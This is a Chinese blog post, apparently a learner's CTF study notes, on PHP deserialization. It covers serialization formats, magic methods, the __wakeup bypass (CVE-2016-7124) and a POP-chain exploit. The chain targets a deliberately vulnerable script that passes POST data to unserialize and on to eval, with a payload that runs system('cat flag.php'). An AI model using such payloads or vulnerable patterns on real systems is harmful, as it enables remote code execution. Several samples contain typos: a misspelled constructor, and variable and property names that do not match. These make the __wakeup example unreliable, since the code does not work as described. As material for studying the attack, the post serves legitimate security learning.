PHP反序列化的学习

2026/4/11 web 学习

在学习PHP反序列化之前，我们先要了解以下几个知识点：(推荐使用菜鸟教程进行学习)

  • PHP的基本语法（进行代码审计的基础）

  • 类与对象（PHP反序列化中涉及大量类与对象的相关知识）

  • 中华人民共和国网络安全法（如何顺利地吃上国家饭）

在学习完了上面的内容之后，就可以开始PHP反序列化的学习(折磨)了

首先是PHP序列化与反序列化的两个函数，这一篇章需要大量使用它们，如下所示：

PHP序列化函数： serialize(mixed value):string

将PHP对象序列化之后，以字符串的形式返回,方便数据的存储，在 PHP 中，他们常被用到缓存、session、cookie 等地方。

//各数据类型的序列化样例
$i = 1;        //i:1;    整数
$d = 1.1;    //d:1.1；    小数
$n = NULL;    //N;    空值
$b = true;    //b:1;    布尔型
$s = "hello"    //s:5:"hello";    字符串
$a = array("hello","cyberspace")    //a:2:{i:0;s:5:"hello";i:1;s:10:"cyberspace";} 数组
class A{    //普通类
  private $num = 10;
  protected $f = flag;        
  public $l = NULL;
}    //O:1:"A":3:{s:6:"\0A\0num";i:10;s:4:"\0*\0f";s:4:"flag";s:1:"l";N;}

以上便是几种基础的数据类型序列化后的结果，更复杂的组合请自行去探索。（其实是懒得敲）

PHP反序列化函数：unserialize(string $str):mixed

顾名思义，PHP反序列化就是PHP序列化的逆过程，所以在此也不进行过多赘述。

魔术方法

是开发者用来控制序列化与反序列化的一组特殊方法，标志是这类方法通常以双下划线__开头

魔术方法 触发时机
__construct() 当对象被创建时触发
__destruct() 当对象被销毁时触发
__wakeup() 当对象被反序列化时触发
__sleep() 当对象被序列化时触发
__toString() 当对象被转换为字符串时触发
__invoke() 当对象被作为函数调用时触发
__call() 当调用对象中无法访问或不存在的方法时触发
__callStatic() 在静态上下文中，调用对象中无法访问或不存在的方法时触发
__get() 读取不存在或无法访问的属性时触发
__set() 将数据写入不可访问的属性时触发
__isset() 在不可访问的属性上调用isset()或empty()时触发
__unset() 在不可访问的属性上使用unset()时触发

以上便是比较常见的魔术方法，除去上面的还有一些其它的魔术方法，详情请见PHP官方文档。

实战利用

这里的话我只刷了hello-ctf的入门靶场，见识浅薄，勿骂。
靶场网站如下hello-ctf PHP反序列化靶场

  • 序列化的权限修饰

通过前面给出的类的序列化示例，也能看出不同权限的属性序列化后属性名有所不同。这里也给出示例：

class A{
    public $a = 1;
    protected $b = 2;
    private $c = 3;
}
$Ac = new A();
$As = serialize($Ac);
echo $As;
//输出：O:1:"A":3:{s:1:"a";i:1;s:4:"\0*\0b";i:2;s:4:"\0A\0c";i:3;}

可以看到序列化后公共属性显示为”属性名”，受保护属性显示为”\0*\0属性名”，私有属性显示为”\0类名\0属性名”，其中\0为不可见字符(url编码后为%00),在正常的输出中是不可见的。

echo urlencode($As);
//输出：O%3A1%3A%22A%22%3A3%3A%7Bs%3A1%3A%22a%22%3Bi%3A1%3Bs%3A4%3A%22%00%2A%00b%22%3Bi%3A2%3Bs%3A4%3A%22%00A%00c%22%3Bi%3A3%3B%7D

所以通常来说，对序列化的结果进行url编码，防止不可见字符的丢失。

通过上面的方法之后，我们就可以在序列化字符串中对受保护属性与私有属性进行修改。

  • __wakeup()绕过(CVE-2016-7124)
class FLAG{
    public $get_context;
    public function __contruct(){
        $this -> get_context = get_flag;
    }
    public function __wakeup(){
        $this -> get_context = NULL;
    }
}

$flag = new FLAG();
$serializeflag = serialize($flag);
$unserializefalg = unserialize($serializeflag);
if(!strcmp($unserializeflag->get_context,"get_flag")){    //strcmp()检查两个字符串是否相等，若相等，则返回0。
    echo 'flag{···}'
}

如上面所示，只有当反序列化后get_content的值等于get_flag的时候才会输出flag。

我们通过观察可以发现类实例化时构造函数会将get_content的值初始化为get_flag，但在反序列化时__wakeup()会触发，将get_content重新初始化为NULL，所以我们主要考虑的时如何在反序列化时让__wakeup()不触发。

这里我们使用CVE-2016-7124中的方法，我们在类序列化后的属性数量上+1，__wakeup()函数便不会触发，于是就绕过了__wakeup()。

  • POP链的构造

POP链：是指从现有运行环境中寻找一系列的代码或指令调用，然后根据需求构造出一组连续的调用链。

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}
class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}
class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }
    public function __wakeUp() {
        $this->d->action();
    }
}
class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b);
    }
}

if(isset($_POST['o'])) {
    unserialize($_POST['o']);
} else {
    highlight_file(__FILE__);
}
//改编自hello-ctf的PHP反序列化靶场level15（其实就只是减少一个类）

通过观察上面代码，我们需要构造一个类D的序列化字符串，通过其反序列化触发的__wakeup()去使用类destnation中的action()方法，在进一步的访问类A、类B，最后获取一个字符串，去进行命令执行。

所以根据以上思路，构造exp如下:

//假设flag.php在同级目录下
$b = new B("system('cat flag.php');");
$a = new A($b);
$des = new destnation($a);
$d = new D($des);
$exp = serialize($d);
echo "o=".$exp;
//输出：o=O:1:"D":1:{s:1:"d";O:10:"destnation":1:{s:3:"cmd";O:1:"A":1:{s:1:"a";O:1:"B":1:{s:1:"b";s:23:"system('cat flag.php');";}}}}

通过上面的构造，就可以成功地进行命令执行，获取flag。
